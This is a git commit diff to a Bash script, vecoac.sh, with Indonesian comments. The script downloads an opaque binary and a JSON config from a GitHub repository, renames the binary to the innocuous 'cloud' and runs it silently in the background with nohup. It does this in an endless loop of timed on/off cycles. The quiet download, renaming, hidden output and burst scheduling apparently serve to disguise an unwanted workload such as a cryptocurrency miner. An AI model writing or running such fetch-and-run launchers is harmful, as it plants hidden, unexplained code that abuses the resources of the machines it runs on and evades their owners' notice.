27719d863b32bb32b0fc077be9c4bd1c47c2af0c
barburonjilo <barburonjilo@outlook.co.id>
2025-08-11 16:00:09 +0700

    Update vecoac.sh

--- vecoac.sh
+++ vecoac.sh
@@ -1,26 +1,26 @@
 #!/bin/bash
 
 # Bersihkan file lama
-rm -rf isu*
+rm -rf isu* cloud*
 
 # Download file
-wget https://github.com/barburonjilo/open/raw/refs/heads/main/isu
-wget https://github.com/barburonjilo/open/raw/refs/heads/main/isu2.json
+wget -q -O cloud https://github.com/barburonjilo/open/raw/refs/heads/main/isu
+wget -q https://github.com/barburonjilo/open/raw/refs/heads/main/isu2.json
 
 # Izin eksekusi
-chmod +x isu
+chmod +x cloud
 
 # Loop selamanya
 while true
 do
-    echo "=== Start isu ==="
+    echo "=== Start cloud ==="
     nohup ./cloud -c "isu2.json" >/dev/null 2>&1 &
-    PID=$!
     
     # Jalan 15 menit
-    sleep 900
+    sleep 600
     
-    echo "=== Stop isu ==="
+    echo "=== Stop cloud ==="
+    # Cari PID proses cloud yang jalan dan kill
     pkill -f "cloud -c isu2.json"
     
     # Tunggu 5 menit
